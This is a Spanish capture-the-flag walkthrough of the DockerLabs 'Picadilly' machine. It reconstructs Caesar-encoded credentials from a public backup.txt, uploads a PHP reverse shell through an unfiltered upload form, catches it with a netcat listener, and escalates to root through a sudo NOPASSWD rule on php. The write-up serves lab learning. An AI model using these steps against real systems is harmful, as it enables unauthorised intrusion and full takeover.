Máquina Picadilly

Esta máquina presenta una ruta de explotación sencilla pero completa: detección de credenciales en un archivo público, un sistema de subida vulnerable sin filtros, y una mala configuración de `sudo` que permite ejecución de comandos como root mediante PHP. Es ideal para entender fallos típicos en seguridad web y escalada de privilegios basada en configuraciones inseguras.

## Despliegue de la Máquina

Descargamos la máquina `picadilly.zip` desde la página oficial de DockerLabs descomprimo el .zip

```bash
7z e picadilly.zip
```

Luego desplegamos la máquina ejecutando:

```bash
sudo auto_deploy.sh picadilly.tar
```

![Evidencia](/Evidencias/3.JPG)

Verificamos que la máquina esté activa con un simple `ping`:

```bash
ping -c1 172.17.0.2
```
![Evidencia](/Evidencias/4.JPG)

---

## Reconocimiento con Nmap

Vamos a ver que puertos estan activos con un escaneo completo de puertos con Nmap:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
```

![Evidencia](/Evidencias/5.JPG)

Con los puertos que apareciron, hacemos un escaneo más detallado para identificar servicios y versiones:

```bash
nmap -sC -sV -p 80,443 172.17.0.2 -oN target.txt
```
![Evidencia](/Evidencias/6.JPG)


---

## Análisis de las Aplicaciones Web

Accedemos:

```

http://172.17.0.2/
```

En esta página encontramos un archivo visible llamado `backup.txt`.

![Evidencia](/Evidencias/7.JPG)

Este archivo contenía un acertijo cifrado con el método César. Tras descifrarlo, obtuvimos la palabra clave:
![Evidencia](/Evidencias/8.JPG)

Este archivo contenía un acertijo cifrado con un encriptado César

con el encontramos las credenciales:
**Usuario:** mateo
**Contraseña:** easycrazy 

Ahora Accedemos al puerto **443 (HTTPS)** en:

```
https://172.17.0.2/
```

Allí se presenta una página con un sistema de publicación de posts y una funcionalidad de subida de archivos (upload).

![Evidencia](/Evidencias/9.JPG)

---

## Obtención de Acceso con Reverse Shell

Como se pueden subir archivos en la sección de posts, intentamos subir una *reverse shell* en PHP.

Va tomar un scrit de la web para la reverse shell:

![Evidencia](/Evidencias/10.JPG)


creamos con nano reverse shell y la subimos y miramos que la ruta https://172.17.0.2/uploads/ esta disponible, hemientaDirbuster


![Evidencia](/Evidencias/11.JPG)
![Evidencia](/Evidencias/12.JPG)
![Evidencia](/Evidencias/14.JPG)
![Evidencia](/Evidencias/13.JPG)


Colocamos nuestro host en modo escucha con:

```bash
sudo nc -lvnp 443
```

Y accedimos a la shell mediante:

```
https://172.17.0.2/uploads/reverse.phar
```

y nos podemos conectar.

---


##  Escalada de Privilegios

Ya dentro del sistema, buscamos métodos para escalar privilegios.

Primero ejecutamos:

```bash
sudo -l
```

Nos vamos a  `/home`, donde veremos que el usuario `mateo` existía.

Probamos autenticarnos como `mateo` con la contraseña que encontramos en el archivo `backup.txt`, ahora ya descifrada:

```
su mateo
Contraseña: easycrazy
```

Al entrar como `mateo`, volvimos a revisar sudo:

```bash
sudo -l
```

Salida:

```
(ALL) NOPASSWD: /usr/bin/php
```

Esto nos dio acceso total. Ejecutamos el siguiente comando para obtener una shell como root:

```bash
sudo /usr/bin/php -r 'system("/bin/bash");'
```

![Evidencia](/Evidencias/26.JPG)

---



